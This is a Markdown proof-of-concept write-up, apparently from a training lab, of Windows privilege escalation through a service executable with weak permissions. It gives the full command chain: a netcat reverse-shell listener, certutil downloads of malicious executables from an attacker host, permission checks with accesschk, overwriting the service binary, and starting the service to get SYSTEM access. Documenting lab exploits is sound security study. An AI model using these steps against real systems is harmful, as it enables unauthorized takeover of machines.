## Proof of Concept: Privilege Escalation via Insecure Service Executables

### Vulnerability Overview

**Insecure Service Executables** is a vulnerability in Windows systems where the executable file (binary) of a service has weak permissions, allowing an unprivileged user to modify or replace it. Since Windows services often run with elevated privileges (e.g., `SYSTEM`), altering the executable can lead to privilege escalation, granting attackers higher-level access to the system.

---

### Proof of Concept (PoC)

This PoC demonstrates how an unprivileged user can exploit the "Insecure Service Executables" vulnerability to escalate privileges on a target system. The process involves gaining initial access, identifying the vulnerable service, replacing its binary with a malicious executable, and executing the service to achieve elevated privileges.

#### Initial Setup and Access
- Gained initial access to the target system using user credentials.
- Established a reverse shell for command execution:
  - On the attacker machine, set up a listener using Netcat:  
    ```bash
    nc -nlvp 2294
    ```
  - On the target system, downloaded a malicious executable (`esc.exe`) to create a reverse shell:  
    ```bash
    certutil -urlcache -split -f http://10.4.106.235/esc.exe
    ```
  - **Result**: Successfully downloaded the malicious file, and the attacker machine received a connection via the reverse shell.  
    ![Reverse Shell Setup](https://github.com/user-attachments/assets/ed210457-164b-4e99-b1a3-6730248cad22)

#### Step 1: Identify the Vulnerable Service
- Queried the service `filepermsvc` to check its configuration using the following command:  
  ```bash
  sc qc filepermsvc
  ```
- **Findings**:  
  - The service runs with elevated privileges: `SERVICE_START_NAME: LocalSystem`.  
  - The binary path is: `BINARY_PATH_NAME: "C:\Program Files\File Permissions Service\filepermservice.exe"`.  
  - **Screenshot**: Service Configuration  
    ![Service Details](https://github.com/user-attachments/assets/99ea3641-0012-477a-8ccc-d65e00f4df42)

#### Step 2: Check Permissions on the Service Binary
- Used `accesschk.exe` from Sysinternals to analyze permissions on the service binary:  
  ```bash
  C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
  ```
  - **Command Breakdown**:  
    - `/accepteula`: Auto-accepts the EULA.  
    - `-q`: Quiet mode, suppresses banners.  
    - `-u`: Checks user-level access only.  
    - `-v`: Verbose output for detailed permissions.  
    - `-w`: Checks for write permissions.  
    - `C:\PrivEsc\accesschk.exe`: Path to the tool.  
    - `"C:\Program Files\File Permissions Service\filepermservice.exe"`: Target binary path.  
  - **Screenshot**: Access Check Command  
    ![Access Check Command](https://github.com/user-attachments/assets/b24ea522-1fcb-407c-a1c6-0dbded26f5c0)

- **Result**: The user account has read and write access to the binary: `RW BUILTIN\Users FILE_ALL_ACCESS`, confirming the vulnerability.  
  - **Screenshot**: Permission Results  
    ![Permission Results](https://github.com/user-attachments/assets/8812cb56-968f-493a-8733-af8b11a0e10d)

#### Step 3: Exploit the Vulnerability (Method 1 - Reverse Shell)
- Uploaded the malicious file `esc.exe` to the target system (already downloaded in the initial setup).  
- Replaced the original service binary with the malicious file:  
  ```bash
  copy esc.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
  ```
  - `/Y`: Overwrites the file without prompting.  
  - **Screenshot**: File Replacement  
    ![File Replacement](https://github.com/user-attachments/assets/85c1e6f0-bf8e-481f-a5f6-5e055be05dc2)

- Started the service to execute the malicious binary:  
  ```bash
  net start filepermsvc
  ```
- **Result**: The service executed `esc.exe`, which established a reverse shell with `SYSTEM` privileges on the attacker machine.  
  - **Screenshots**: Reverse Shell with Admin Privileges  
    ![Reverse Shell Active](https://github.com/user-attachments/assets/2819563c-bbe4-42e7-af9f-29cd6a186274)  
    ![Admin Privileges Confirmed](https://github.com/user-attachments/assets/22f9cc78-800f-43d3-9e7b-d4fe7944b35a)

#### Step 4: Exploit the Vulnerability (Method 2 - Add User to Admin Group)
- Uploaded a second malicious file, `x.exe`, a compiled Windows service binary designed to add the current user to the Administrator group:  
  ```bash
  certutil -urlcache -split -f http://10.4.106.235/x.exe
  ```
  - **Screenshot**: File Upload  
    ![File Upload](https://github.com/user-attachments/assets/e8ea9a11-9260-4faf-858b-9ae83964c9ae)

- Replaced the service binary with `x.exe`:  
  ```bash
  copy x.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
  ```
  - **Screenshot**: File Replacement  
    ![File Replacement](https://github.com/user-attachments/assets/acb2c733-d030-4cea-a430-e7fc7a986807)

- Checked the user’s privileges before executing the service:  
  - **Screenshot**: Initial User Privileges  
    ![Initial Privileges](https://github.com/user-attachments/assets/829b828e-8bdd-4d92-abfe-23a8e433bb75)

- Started the service to execute the malicious binary:  
  ```bash
  net start filepermsvc
  ```
- **Result**: The service executed `x.exe`, adding the user to the Administrator group, successfully escalating privileges.  
  - **Screenshot**: Updated User Privileges  
    ![Updated Privileges](https://github.com/user-attachments/assets/906ade65-553d-4d50-8bb0-2b7e299165b9)

---

### Summary of Findings

- The `filepermsvc` service binary had insecure permissions, allowing the `BUILTIN\Users` group to modify it (`FILE_ALL_ACCESS`).  
- Two methods were used to exploit this vulnerability:  
  1. Replaced the binary with `esc.exe`, gaining a reverse shell with `SYSTEM` privileges.  
  2. Replaced the binary with `x.exe`, adding the user to the Administrator group.  
- Both methods successfully escalated privileges, demonstrating the severity of the vulnerability.

---

### Conclusion

This PoC confirms that the "Insecure Service Executables" vulnerability in the `filepermsvc` service allows an unprivileged user to escalate privileges to `SYSTEM` or Administrator level. By exploiting weak permissions on the service binary, attackers can execute arbitrary code with elevated privileges, posing a significant risk to system security. Immediate remediation is recommended, such as restricting permissions on service binaries and ensuring services run with the least privilege necessary.

---

